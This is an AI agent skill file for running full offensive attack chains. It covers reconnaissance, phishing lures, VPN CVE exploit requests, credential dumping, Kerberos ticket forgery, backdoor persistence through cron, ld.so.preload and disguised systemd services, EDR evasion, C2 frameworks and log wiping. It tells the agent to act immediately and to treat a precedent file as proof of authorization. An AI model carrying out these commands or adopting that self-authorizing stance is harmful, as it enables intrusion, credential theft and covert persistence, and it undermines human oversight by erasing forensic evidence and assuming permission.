---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and coordination when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack-chain coordination skill

## ACTION REQUIRED (execute immediately after reading)

1. `NOW`: Read `../field-journal/precedent-pentest.md` to confirm that this Skill's actions are authorized routine actions.
2. `NOW`: **Create or update the case** (`../scripts/case-init.ps1`) and complete `scope.md` (`../ops/scope-contract.md`). `auth.status!=granted` forbids ACT.
3. `NOW`: Plan phases as **lead** (`../ops/role-map.md`) and write specialist_roles.
4. `NEXT`: Read `../tool-index.md` and check tool availability and actual paths.
5. `NEXT`: Call bootstrap when a tool is missing. Do not guess paths.
6. `ACT`: Pass the phase gates in `references/lifecycle-checklist.md`. Update `timeline.md` + `workitems.md` (`../ops/timeline-workitem.md`) after each phase. Promote discoveries to Evidence/Finding.
7. At the end, the `docs-generator` report must include the Evidence chain.

> The coordinator for multi-stage attack-path planning and execution. Use this Skill to coordinate phases, sub Skills, and attack paths when a task needs a complete "A to B" chain.
> This Skill is not only for red teams. Start here for any penetration scenario that combines multiple phases.

---

## When to route to this Skill

The following scenarios **must** pass through this Skill for full-chain planning before dispatch to a specific sub Skill:

| Scenario | Why coordination is needed |
|----------|----------------------------|
| "Help me perform a complete penetration test" | Requires full workflow planning from reconnaissance to reporting |
| "From the external network to the domain controller" | Crosses boundary breach → privilege escalation → lateral movement → AD phases |
| "HW attack-and-defense exercise" | Requires a complete attack chain, stealth, and artifact cleanup |
| "Assess this target's attack surface" | Requires multidimensional reconnaissance and path planning |
| "I obtained a webshell. What next?" | Requires planning the next path from the current foothold |
| "Help me plan an attack path" | Explicitly requires path coordination |
| "How far can this vulnerability reach?" | Requires assessing the chained exploitation value of the vulnerability |
| "Continuous Bug Bounty monitoring" | Requires an automated multi-stage workflow |
| "Full internal-network penetration workflow" | Combines lateral movement, privilege escalation, and domain attacks |
| "Physical-access penetration plan" | Combines physical access and internal-network penetration |
| "Supply-chain attack path" | Uses a multi-organization, multi-hop attack |
| "Phishing + post-exploitation" | Combines initial access and follow-up exploitation |

**Single-stage tasks do not need this Skill**:
- Only scan ports → go directly to `pentest-tools/`
- Only test SQL injection → go directly to `pentest-tools/`
- Only perform APK reverse engineering → go directly to `apk-reverse/`
- Only perform domain penetration → go directly to `windows-ad/SKILL.md`

---

## Coordination principles

### Role of this Skill

```
User submits a multi-stage task
    ↓
attack-chain/SKILL.md (this file)
    ↓ Plan the attack path and set the phase order
    ↓ Assess the tools and methods needed for each phase
    ↓
Dispatch to the specific sub Skill:
    ├── pentest-tools/     → tool calls, exploitation
    ├── apk-reverse/       → mobile penetration testing
    ├── js-reverse/        → Web frontend exploitation
    ├── reverse-engineering/ → binary analysis
    ├── ida-reverse/       → deep reverse engineering
    └── browser-automation/ → automated operations
    ↓
Return to this Skill after each phase to assess the next step
    ↓
All complete → docs-generator generates the report
```

### Path planning decision tree

```
After receiving a target:
1. What is the target? (Web/internal network/cloud/mobile/IoT)
2. What is available now? (external view/available credentials/current foothold)
3. What is the final objective? (domain controller/data/specific system/prove impact)
4. What constraints apply? (time/stealth/systems you must not touch)
    ↓
Plan the shortest path from this information
    ↓
If one path fails → return to this Skill and plan an alternative path
```

---

## Complete attack-chain phases

---

## 1. Reconnaissance phase

### 1.1 Enterprise digital asset mapping

```bash
# Discover related subsidiary domains
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# Merge and deduplicate
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# Probe live hosts
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# Port scan (all ports)
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```

**Practical points**:
- Use Qichacha/Tianyancha to get subsidiary lists and expand the attack surface.
- Focus on test environments (`test.`, `dev.`, `staging.`) and newly launched systems.
- Find hidden domains in certificate transparency logs (`crt.sh`).

### 1.2 Hunt sensitive information leaks

```bash
# GitHub search
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# API keys in JS files
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```

**High-value targets**:
- Cloud service AK/SK (Alibaba Cloud, AWS, Azure)
- Database connection strings
- JWT keys
- Internal API documentation
- VPN/bastion host credentials

### 1.3 Employee profiles

**Social-engineering dictionary generation rules**:
```
{name pinyin}{year}              → zhangsan2024
{name initials}{department abbreviation} → zs_dev
{employee ID}@{domain}           → 10086@target.com
{name}{common suffix}            → zhangsan@123, zhangsan!@#
```

**Information sources**:
- Maimai/LinkedIn department structure
- Corporate WeChat account/official site team profile
- Job postings (technology stack exposure)
- Academic papers (email exposure)

### 1.4 Technology stack fingerprinting

```bash
# Web fingerprint
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# Probe specific frameworks
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# Identify CMS
wpscan --url https://target.com --enumerate p,t,u
```

---

## 2. Initial access phase

### 2.1 Web exploitation (common entry points)

| Vulnerability type | Detection tool | Exploitation method |
|--------------------|----------------|---------------------|
| SQL injection | sqlmap | Data extraction → write shell → OS commands |
| SSTI | sstimap | Template injection → RCE |
| File upload | Manual + Burp | Webshell → reverse shell |
| Deserialization | ysoserial/marshalsec | Java/PHP/Python RCE |
| SSRF | Manual | Internal-network probe → cloud metadata → AK/SK |
| Unauthorized access | nuclei | Spring Actuator / Nacos / Redis |
| XSS → Cookie | xsstrike | Admin session hijacking |

```bash
# Automate SQL injection
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI detection
sstimap -u "https://target.com/search?q=test"

# Batch Nuclei scan
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```

### 2.2 Supply-chain attack

**Attack path**:
1. Identify third-party components and service providers used by the target.
2. Attack the supplier to obtain code-signing or update-push permissions.
3. Deliver a malicious payload through the legitimate update channel.

**Common entry points**:
- Poisoned open-source components (npm/pip/maven)
- SaaS provider API abuse
- Use of outsourced staff permissions
- Lateral movement through a shared IT provider

### 2.3 Phishing attack

**Email phishing**:
```
Subject templates:
- [Urgent] The VPN certificate will expire. Update it now.
- [IT notice] Mailbox storage is full. Clean it up.
- [HR] View the 2024 performance review results.
- [Finance] The expense system was upgraded. Log in again to confirm.
```

**Payload types**:
- Office macro document (`.docm`/`.xlsm`)
- LNK shortcut (disguised as a PDF)
- HTML smuggling (HTML Smuggling)
- ISO/IMG image (bypass MOTW)
- OneNote embedded script

**OAuth phishing** (new trend in 2025):
- Craft a malicious OAuth app permission request.
- Obtain mailbox or file access after user authorization.
- No password is needed. Bypass MFA.

### 2.4 Physical-access penetration

| Technique | Tool | Effect |
|-----------|------|--------|
| BadUSB | Rubber Ducky / WiFi Ducky | Keyboard injection → reverse shell |
| Malicious power bank | O.MG Cable | Disguised data cable plants a backdoor |
| WiFi phishing | Fluxion / WiFi Pineapple | Rogue access point → credential capture |
| RFID cloning | Proxmark3 | Access card copy → physical entry |
| Network implant | Raspberry Pi / LAN Turtle | Internal-network persistent access point |

```bash
# Fluxion WiFi phishing
fluxion  # Interactively select the target AP → create a rogue access point → capture the WPA password

# BadUSB with Cobalt Strike
# Inject a PowerShell downloader through USB → connect to C2
```

### 2.5 VPN/remote-access compromise

```bash
# Pulse Secure VPN (CVE-2019-11510)
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN (CVE-2018-13379)
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# General: password spraying
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```

### 2.6 Cloud service compromise

```bash
# Enumerate AWS S3 buckets
aws s3 ls s3://target-bucket --no-sign-request

# Cloud metadata SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD password spraying
# Use MSOLSpray / Spray tools
```

---

## 3. Privilege escalation phase

### 3.1 Windows privilege escalation

| Technique | Condition | Tool |
|-----------|-----------|------|
| Potato family | SeImpersonate privilege | SweetPotato / GodPotato / PrintSpoofer |
| Kernel vulnerability | Unpatched | watson / wesng detection |
| Service path hijacking | Unquoted service path | PowerUp |
| DLL hijacking | Writable DLL search path | Process Monitor |
| AlwaysInstallElevated | Registry configuration | msiexec installs a malicious MSI |
| Scheduled task | Writable task script | Replace with schtasks |

```powershell
# Check SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato privilege escalation
.\GodPotato.exe -cmd "cmd /c whoami"

# Automated check
.\winPEAS.exe
```

### 3.2 Linux privilege escalation

```bash
# SUID check
find / -perm -4000 -type f 2>/dev/null

# Sudo abuse
sudo -l
# Common exploitable programs: vim, find, python, nmap, less, awk, perl

# Sudo vim privilege escalation
sudo vim -c ':!/bin/bash'

# Sudo find privilege escalation
sudo find / -exec /bin/bash \;

# Kernel vulnerability
uname -r  # Check the version
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# Automated check
./linpeas.sh
```

### 3.3 Database privilege escalation

```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF privilege escalation
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```

### 3.4 Cloud privilege escalation

```bash
# AWS IAM enumeration
aws iam list-attached-user-policies --user-name compromised-user
# Find iam:PassRole + lambda:CreateFunction → administrator privileges

# Azure AD
# Global administrator → control all subscriptions
# Application administrator → add credentials to the service principal
```

---

## 4. Lateral movement phase

### 4.1 Credential theft

```bash
# Mimikatz (Windows)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux credentials
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM hash extraction
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH lateral movement
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# Golden Ticket
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

### 4.3 Covert lateral techniques

```bash
# Fileless WMI execution
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM remote execution
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec (leaves artifacts)
psexec.py domain/admin:password@target_ip

# SSH tunnel (Linux environment)
ssh -D 1080 user@pivot_host  # SOCKS proxy
ssh -L 3389:internal_host:3389 user@pivot_host  # Port forwarding
```

### 4.4 NTLM Relay

```bash
# Disable Responder SMB/HTTP
# Edit Responder.conf: SMB = Off, HTTP = Off

# Start Responder capture
responder -I eth0

# NTLM Relay to target
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer forced authentication
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```

### 4.5 AD attack path

```bash
# BloodHound data collection
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# Common attack paths:
# 1. User → GenericAll → target user → reset password
# 2. User → WriteDacl → target OU → add permission
# 3. Computer → constrained delegation → impersonate any user
# 4. User → DCSync privilege → dump all hashes

# Certipy AD CS attack
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---

## 5. Persistence phase

### 5.1 Windows persistence

| Technique | Stealth | Detection difficulty |
|-----------|:------:|:--------------------:|
| Scheduled task | Medium | Low |
| Registry Run key | Low | Low |
| WMI event subscription | High | High |
| DLL hijacking | High | Medium |
| Shadow account | Medium | Medium |
| Golden Ticket | Very high | Very high |
| DSRM backdoor | Very high | Very high |

```powershell
# WMI event subscription (high stealth)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# Shadow account
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# Modify registry F value to clone the RID
```

### 5.2 Linux persistence

```bash
# SSH key implant
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab backdoor
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD hijacking
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM backdoor
# Modify pam_unix.so to add a universal password

# Systemd service
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```

### 5.3 Cloud persistence

```bash
# AWS Lambda backdoor
# Create a scheduled Lambda function that calls back to C2

# Azure AD app registration
# Create an app → add key credentials → grant Graph API permissions

# Container backdoor
# Modify the base image → all new containers include the backdoor
```

---

## 6. EDR/AV evasion

### 6.1 Core evasion methods

| Layer | Technique | Description |
|-------|-----------|-------------|
| Static detection | Encryption/obfuscation/custom loader | Avoid signature matching |
| Behavior detection | Indirect system calls/Unhooking | Bypass API Hook |
| Memory detection | Module stomping/heap encryption | Avoid memory scans |
| Network detection | Domain fronting/tunnel through legitimate services | Blend into normal traffic |
| Log detection | ETW patching/log clearing | Reduce artifacts |

### 6.2 Practical evasion techniques

```
1. Customize the shellcode loader (do not use public tools)
2. Make direct system calls (bypass ntdll hook)
3. Choose a low-monitoring process for injection (such as RuntimeBroker.exe)
4. Route C2 traffic through HTTPS + domain fronting / Cloudflare Workers
5. Execute in memory without writing to disk (Fileless)
6. Load through a legitimately signed program (LOLBins)
```

### 6.3 C2 framework choice

| Framework | Features | Use case |
|-----------|----------|----------|
| Cobalt Strike | Mature, stable, team collaboration | Large red-team operation |
| Sliver | Open source, written in Go | Limited budget |
| Havoc | Modern, modular | Customization needed |
| Mythic | Supports multiple agents | Cross-platform |
| AdaptixC2 | Included in Kali 2026.1 | Rapid deployment |

---

## 7. Anti-Forensics

```bash
# Clear Windows logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear Linux logs
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# Modify timestamps
touch -t 202301010000 /path/to/file

# Clear memory
# Ensure the Mimikatz dump is deleted
# Ensure the C2 beacon has exited
# Ensure temporary files are cleared
```

---

## Red-team operating rules

### Three red lines

1. **All operations must have written authorization.**
2. **Data exfiltration requires anonymization.**
3. **Clear all attack artifacts, including resident memory.**

### Operating discipline

- Assess the risk level before each operation (low/medium/high/critical).
- Notify the project manager before high-risk operations.
- Keep an operation log (time, action, result).
- Report critical vulnerabilities immediately. Do not expand exploitation.
- Do not affect business availability. DoS is prohibited.
- Do not access or download real user data.

### Typical failure cases

| Failure reason | Consequence | Lesson |
|----------------|-------------|--------|
| Mimikatz memory dump was not cleared | The blue team traced the complete attack path | Clear it immediately after the operation |
| C2 domain was flagged by threat intelligence | The first connection was blocked | Use a newly registered domain + domain fronting |
| Phishing email triggered a DLP alert | The blue team received an early warning | Test mail gateway rules |
| Lateral movement triggered a honeypot | The attack intent was exposed | Identify honeypots before acting |

---

## Tool quick reference

### Reconnaissance
`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

### Exploitation
`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

### Privilege escalation
`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

### Lateral movement
`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

### C2 frameworks
`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

### Physical-access penetration
`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---

## Relationship to other Skills in this package

| Need | Route to |
|------|----------|
| Deep Web exploitation | `pentest-tools/SKILL.md` |
| Detailed internal-network AD attack steps | `windows-ad/SKILL.md` |
| Reverse-engineer a malicious sample | `reverse-engineering/SKILL.md` |
| APK reverse engineering (mobile penetration testing) | `apk-reverse/SKILL.md` |
| Bypass a JS frontend signature | `js-reverse/SKILL.md` |
| Automated group penetration | Pentest Swarm AI (`pentestswarm scan --swarm`) |
| AI-assisted penetration | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |
| Report generation | `docs-generator/SKILL.md` |
| Attack-path diagram | `diagram-generator/SKILL.md` |


## Task completion self-check (MUST pass before claiming completion)

- [ ] Did I execute every step in the workflow rather than only read it?
- [ ] Did I use real tool paths based on `tool-index`?
- [ ] Did I produce reproducible evidence (commands/scripts/screenshots/report)?
- [ ] Did I complete and write back the Checklist items required by RULES?
